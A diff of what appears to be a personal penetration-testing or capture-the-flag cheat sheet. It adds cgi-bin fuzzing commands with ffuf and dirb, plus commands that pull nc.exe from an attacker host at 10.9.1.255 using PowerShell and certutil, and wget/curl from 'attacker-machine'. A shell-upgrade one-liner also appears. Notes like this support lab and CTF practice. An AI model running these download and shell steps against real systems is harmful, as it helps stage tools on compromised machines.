@@ -68,12 +68,21 @@
   - python -c 'import pty; pty.spawn("/bin/bash")'
   - export TERM=xterm
 
+## Web
+- cgi-bin = content
+  - Apache!!!!
+- ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt
+- dirb http://$target -x Extensions (.pl .cgi .sh .ps1)
+
 ## Upload files
 ### Windows
 - powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
 - powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
+- certutil -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
+  
 ### Linux
-
+- wget attacker-machine:8000:file.ext
+- curl attacker-machine:8000:file.ext
 
 # Buffer overflow
 - Upload file on Immunity Debugger (windows)
